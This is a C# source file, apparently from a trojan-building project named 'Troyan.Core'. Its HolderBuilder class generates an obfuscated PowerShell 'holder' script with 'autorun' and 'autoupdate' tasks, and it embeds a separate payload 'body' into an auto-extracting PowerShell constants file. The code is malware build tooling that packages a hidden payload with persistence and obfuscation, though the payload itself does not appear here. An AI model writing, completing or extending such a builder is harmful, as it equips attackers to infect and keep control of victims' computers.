namespace Troyan.Core;

public sealed class HolderBuilder : CustomBuilder
{
    public HolderBuilder(TroyanBuildMode mode, IPowerShellObfuscator obfuscator) : base(mode, obfuscator)
    {
    }

    protected override string SourceDir => Path.Combine(L.TroyanScriptDir, "holder");
    protected override string OutputFile => Mode == TroyanBuildMode.Debug ? L.HolderPs1Debug : L.HolderPs1;

    protected override string[] PriorityTasks => new[] { "autorun" };
    protected override string[] UnpriorityTasks => new[] { "autoupdate" };
    protected override string EntryPoint => "holder";

    protected override void InternalBuild(string server)
    {
        MakeAutoExtract();
    }

    public void MakeAutoExtract()
    {
        var template = @"
$xbody = ""__BODY""
";
        var bodyPath = Mode == TroyanBuildMode.Debug ? L.BodyDebugTxt : L.Body;
        var body = File.ReadAllText(bodyPath);
        template = template.Replace("__BODY", body);
        var outputPath = Path.Combine(L.TroyanScriptDir, "holder", "consts_autoextract.ps1");
        File.WriteAllText(outputPath, template);
    }

    protected override List<SourceFile> GetSourceFiles()
    {
        var sourceFiles = base.GetSourceFiles();
        sourceFiles.Insert(0, new SourceFile("utils", this));
        sourceFiles.Insert(0, new SourceFile("consts_body", this));
        return sourceFiles;
    }
}
